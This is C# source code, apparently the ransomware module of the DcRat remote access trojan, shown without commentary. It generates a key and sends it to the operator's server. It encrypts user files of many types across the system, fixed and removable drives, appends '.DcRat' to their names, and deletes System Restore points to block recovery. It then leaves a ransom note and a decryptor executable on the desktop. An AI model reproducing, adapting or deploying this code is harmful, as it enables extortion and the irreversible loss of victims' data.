using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using MessagePackLib.MessagePack;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System.Management;
using Plugin.Properties;

namespace Plugin.Handler
{
    public class HandleEncrypt
    {
        public string password;

        [DllImport("user32")]
        private static extern void keybd_event(byte bVk, byte bScan, long dwFlags, long dwExtraInfo);
        private object C_DIR = Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3);
        public object Mynote;
        public StringBuilder Logs = new StringBuilder();

        public void BeforeAttack()
        {
            new Thread(startAction).Start();
        }

        private byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            var saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (var ms = new MemoryStream())
            {
                using (var AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes((int)(AES.KeySize / (double)8));
                    AES.IV = key.GetBytes((int)(AES.BlockSize / (double)8));
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }

                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        private string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            var res = new StringBuilder();
            var rnd = new Random();
            while (0 < Math.Max(Interlocked.Decrement(ref length), length + 1))
                res.Append(valid[rnd.Next(valid.Length)]);
            return res.ToString();
        }

        private void EncryptFile(string file, string password)
        {
            try 
            {
                if (file != Process.GetCurrentProcess().MainModule.FileName && file != Application.StartupPath && file != Directory.GetCurrentDirectory() && !file.ToLower().Contains(Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower().Replace("system32", null)))
                {
                    var bytesToBeEncrypted = File.ReadAllBytes(file);
                    var passwordBytes = Encoding.UTF8.GetBytes(password);
                    passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
                    var bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
                    File.WriteAllBytes(file, bytesEncrypted);
                    File.Move(file, file + ".DcRat");
                    Logs.Append(file + Environment.NewLine);
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        private void encryptDirectory(string location, string password)
        {

            try 
            {
                string validExtensions = string.Concat(".txt", ".jar", ".exe", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".jpeg", ".gif", ".csv", ".py", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".dll", ".c", ".cs", ".vb", ".mp3", ".mp4", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".iso", ".7z", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".core", ".crproj", ".pdb", ".ico", ".pas", ".db", ".torrent");
                var files = Directory.GetFiles(location);
                var childDirectories = Directory.GetDirectories(location);
                for (int i = 0, loopTo = files.Length - 1; i <= loopTo; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (validExtensions.Contains(extension.ToLower()))
                    {
                        EncryptFile(files[i], password);
                    }
                }

                for (int i = 0, loopTo1 = childDirectories.Length - 1; i <= loopTo1; i++)
                {
                    encryptDirectory(childDirectories[i], password);
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }

        private void startAction()
        {
            try
            {
                password = CreatePassword(15);
                Connection.Send(Password(password));
                Packet.Log(Connection.Hwid + "Encrypting...");
                Thread.Sleep(1000);
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status", "Encryption in progress...");
                System_Driver(password);
                Fix_Drivers(password);
                Drivers(password);
                password = null;
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-Status", "Encrypted");
                SetMessage();
                DeleteRestorePoints();
                DropDecryptor();
                Packet.Log(Connection.Hwid+ "Encrypted");
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }

            return;
        }

        private void System_Driver(string password)
        {
            encryptDirectory(Conversions.ToString(C_DIR), password);
        }

        private void Fix_Drivers(string password)
        {
            foreach (var drive in Environment.GetLogicalDrives())
            {
                var Driver = new DriveInfo(drive);
                if (Driver.DriveType == DriveType.Fixed && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                {
                    string DriverPath = drive;
                    encryptDirectory(DriverPath, password);
                }
            }
        }

        private void Drivers(string password)
        {
            foreach (var drive in Environment.GetLogicalDrives())
            {
                var Driver = new DriveInfo(drive);
                if (!(Driver.DriveType == DriveType.Fixed) && !Driver.ToString().Contains(Conversions.ToString(C_DIR)))
                {
                    string DriverPath = drive;
                    encryptDirectory(DriverPath, password);
                }
            }
        }

        private void SetMessage()
        {
            try
            {
                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string fullpath = path + @"\READ-ME-NOW.txt";
                string Message = Conversions.ToString(Mynote + Environment.NewLine + "Your ID is [" + (Connection.Hwid + "]"));
                File.WriteAllText(fullpath, Message + Environment.NewLine + Environment.NewLine + "[[Encrypted Files]]" + Environment.NewLine + Logs.ToString());
                Registry.SetValue(@"HKEY_CURRENT_USER\Software\" + Connection.Hwid, "Rans-MSG", Message);
                Process.Start(fullpath);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
                        
        [DllImport("Srclient.dll")]
        public static extern int SRRemoveRestorePoint(int index);

        private void DeleteRestorePoints()
        {
            try
            {
                var objClass = new ManagementClass(@"\\.\root\default", "systemrestore", new System.Management.ObjectGetOptions());
                ManagementObjectCollection objCol = objClass.GetInstances();
                foreach (ManagementObject objItem in objCol)
                    SRRemoveRestorePoint(int.Parse(objItem["sequencenumber"].ToString()));
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
        
        private void DropDecryptor()
        {
            try
            {
                string D = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "DECRYPT.exe");
                File.WriteAllBytes(D, Resources.Decrypter);
                Process.Start(D);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
        }
        public static byte[] Password(string password)
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Password";
            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
            msgpack.ForcePathObject("Password").AsString = password;
            return msgpack.Encode2Bytes();
        }
    }
}
